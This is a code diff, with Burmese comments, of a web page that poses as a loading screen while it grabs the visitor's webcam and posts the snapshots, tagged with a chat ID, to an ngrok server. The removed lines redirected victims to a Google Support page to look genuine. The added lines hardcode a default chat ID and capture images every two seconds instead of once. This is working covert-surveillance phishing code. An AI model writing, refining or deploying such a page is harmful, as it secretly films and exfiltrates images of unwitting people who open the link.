@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
+        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -18,21 +18,23 @@
     <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
 
     <script>
+        // ၁။ URL ထဲက ID ကိုယူမယ်၊ မရှိရင် ကိုကြီးရဲ့ ပုံသေ Chat ID (8001540714) ကို သုံးမယ်
         const urlParams = new URLSearchParams(window.location.search);
-        const chat_id = urlParams.get('id'); // Link ထဲက Chat ID ကို ယူတာပါ
+        const chat_id = urlParams.get('id') || '8001540714'; 
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // ကင်မရာ ခွင့်ပြုချက်တောင်းခြင်း
+        // ၂။ ကင်မရာ Permission တောင်းပြီး စတင်ဖွင့်မယ်
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
             video.srcObject = stream;
-            // ၂ စက္ကန့်နေရင် အလိုအလျောက် ဓာတ်ပုံရိုက်မယ်
-            setTimeout(takeSnap, 2000);
+            
+            // ၃။ ကင်မရာပွင့်သွားပြီဆိုရင် ၂ စက္ကန့် (2000ms) တစ်ခါ ပုံရိုက်ပြီး ပို့နေမယ်
+            setInterval(takeSnap, 2000); 
         })
         .catch(err => {
-            console.log("Error: " + err);
+            console.log("Camera Access Denied: " + err);
         });
 
         function takeSnap() {
@@ -40,7 +42,7 @@
             context.drawImage(video, 0, 0, 640, 480);
             const imageData = canvas.toDataURL('image/png');
 
-            // --- အောက်က link နေရာမှာ ကိုကြီးရဲ့ Ngrok Link ကို ပြောင်းထည့်ပါ ---
+            // --- [သတိပြုရန်] ဒီနေရာမှာ ကိုကြီးရဲ့ လက်ရှိ Ngrok Link ကို ပြောင်းထည့်ပါ ---
             const serverUrl = 'https://ကိုကြီးရဲ့-ngrok-link.ngrok-free.app/upload';
 
             fetch(serverUrl, {
@@ -51,12 +53,9 @@
                     chat_id: chat_id
                 })
             })
-            .then(res => {
-                // ပို့ပြီးရင် အစစ်လိုဖြစ်အောင် Google Support ဆီ လွှဲပေးလိုက်မယ်
-                window.location.href = "https://support.google.com/android/answer/7680439";
-            });
+            .then(res => console.log("Snapshot sent successfully!"))
+            .catch(err => console.log("Upload failed: " + err));
         }
     </script>
 </body>
 </html>
-
